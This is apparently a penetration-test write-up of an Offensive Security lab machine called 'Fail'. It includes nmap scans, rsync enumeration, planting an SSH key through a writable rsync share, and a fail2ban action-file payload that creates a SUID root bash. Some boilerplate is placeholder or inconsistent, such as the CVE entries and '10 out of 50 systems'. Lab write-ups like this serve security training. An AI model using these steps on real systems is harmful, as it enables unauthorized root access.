# Fail
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2008-1234 | EDB-ID-56789 |
| CVE-2012-5678 | cyberphor POC |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: fail
* Description: You shall not pass.
* IP Address: 192.168.75.126
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Fri Aug 13 10:57:58 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/fail-nmap-complete 192.168.75.126
Warning: 192.168.75.126 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.75.126
Host is up (0.065s latency).
Not shown: 66256 closed ports, 64812 open|filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Aug 13 11:10:24 2021 -- 1 IP address (1 host up) scanned in 746.84 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Fri Aug 13 11:25:23 2021 as: nmap -sV -sC -p22,873 -oN scans/fail-nmap-versions 192.168.75.126
Nmap scan report for 192.168.75.126
Host is up (0.063s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 13 11:25:26 2021 -- 1 IP address (1 host up) scanned in 3.06 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Fri Aug 13 11:26:52 2021 as: nmap -O -oN scans/fail-nmap-os 192.168.75.126
Nmap scan report for 192.168.75.126
Host is up (0.065s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/13%OT=22%CT=1%CU=33846%PV=Y%DS=2%DC=I%G=Y%TM=61168F4
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=Z%II=I%TS=A)OPS(O1=M
OS:506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%
OS:O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 13 11:27:08 2021 -- 1 IP address (1 host up) scanned in 15.45 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### SSH
```bash
# replace scan results
```

### Rsync
```bash
sudo nmap $TARGET -p873 --script rsync-list-modules
rsync -v rsync://192.168.75.126/ --list-only
rsync -v rsync://192.168.75.126/$SHARE --list-only
rsync -v rsync://192.168.75.126/$SHARE loot/$SHARE
```
## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

```bash
ssh-keygen
mkdir .ssh
cp ~/.ssh/id_rsa.pub .ssh/authorized_keys
```

```bash
# -a = ???
# -v = verbose
# --relative = necessary to upload the entire .ssh directory
# .ssh = source directory
# fox/ = destination directory
rsync -av --relative .ssh rsync://192.168.216.126/fox/
sudo ssh -i ~/.ssh/id_rsa fox@192.168.225.126
bash
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
```bash
whoami

# output
fox
```

```bash
id

# output
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

```bash
ps aux | grep root | grep -v "\["

# output
root         1  0.0  0.4 103968 10180 ?        Ss   21:15   0:01 /sbin/init
root       245  0.0  0.4  34776  9404 ?        Ss   21:15   0:00 /lib/systemd/systemd-journald
root       264  0.0  0.2  22068  5036 ?        Ss   21:15   0:00 /lib/systemd/systemd-udevd
root       415  0.0  0.5  48220 10588 ?        Ss   21:15   0:00 /usr/bin/VGAuthService
root       416  0.0  0.6 122876 12268 ?        Ssl  21:15   0:02 /usr/bin/vmtoolsd
root       418  0.0  0.2 225824  4356 ?        Ssl  21:15   0:00 /usr/sbin/rsyslogd -n -iNONE
root       419  0.0  0.3  19392  7336 ?        Ss   21:15   0:00 /lib/systemd/systemd-logind
root       420  0.0  0.1   5924  2604 ?        Ss   21:15   0:00 /usr/bin/rsync --daemon --no-detach
root       422  0.0  0.1   8476  2716 ?        Ss   21:15   0:00 /usr/sbin/cron -f
root       440  0.0  0.0   5612  1488 tty1     Ss+  21:15   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       445  0.0  0.0   2452  1648 ?        S    21:15   0:00 /usr/sbin/inetutils-inetd
root       447  0.0  0.3  15852  6732 ?        Ss   21:15   0:00 /usr/sbin/sshd -D
root      2027  0.2  1.0 250320 22324 ?        Ssl  22:53   0:00 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
fox       2036  0.0  0.0   6208   888 pts/0    S+   22:53   0:00 grep root
```

```bash
ls -al /etc/

# output
drwxr-xr-x  6 root root    4096 Dec  3  2020 fail2ban
```

```bash
ls -al /etc/fail2ban/

# output
total 72
drwxr-xr-x  6 root root      4096 Dec  3  2020 .
drwxr-xr-x 76 root root      4096 Jan 21  2021 ..
drwxrwxr-x  2 root fail2ban  4096 Dec  3  2020 action.d # <--- i have access to these
-rw-r--r--  1 root root      2334 Jan 18  2018 fail2ban.conf
drwxr-xr-x  2 root root      4096 Sep 23  2018 fail2ban.d
drwxr-xr-x  3 root root      4096 Dec  3  2020 filter.d
-rw-r--r--  1 root root     22910 Nov 19  2020 jail.conf
drwxr-xr-x  2 root root      4096 Dec  3  2020 jail.d
-rw-r--r--  1 root root       645 Jan 18  2018 paths-arch.conf
-rw-r--r--  1 root root      2827 Jan 18  2018 paths-common.conf
-rw-r--r--  1 root root       573 Jan 18  2018 paths-debian.conf
-rw-r--r--  1 root root       738 Jan 18  2018 paths-opensuse.conf
-rw-r--r--  1 root root        87 Dec  3  2020 README.fox # <--- what is this?
```

```bash
cd /etc/fail2ban/
cat README.fox

# output
Fail2ban restarts each 1 minute, change ACTION file following Security Policies. ROOT!
```

```bash
cat jail.conf

# output
...snipped...
# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
...snipped...
```

```bash
vim iptables-multiport.conf

# output
...snipped...
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
...snipped...
```

Replace the setting above with the payload below.
```bash
...snipped...
actionban = cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
...snipped...
```

Attempt to login into the target and fail multiple times. This will cause fail2ban to execute the exploit.
```bash
ssh victor@192.168.84.126 
```

```bash
ls -al /tmp/bash

# output
-rws-----x  1 root root 1168776 Aug 17 00:11 bash
```

```bash
/tmp/bash -p
id

# output
uid=1000(fox) gid=1001(fox) euid=0(root) groups=1001(fox),1000(fail2ban)
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap

## Lessons Learned
* Use multiple tools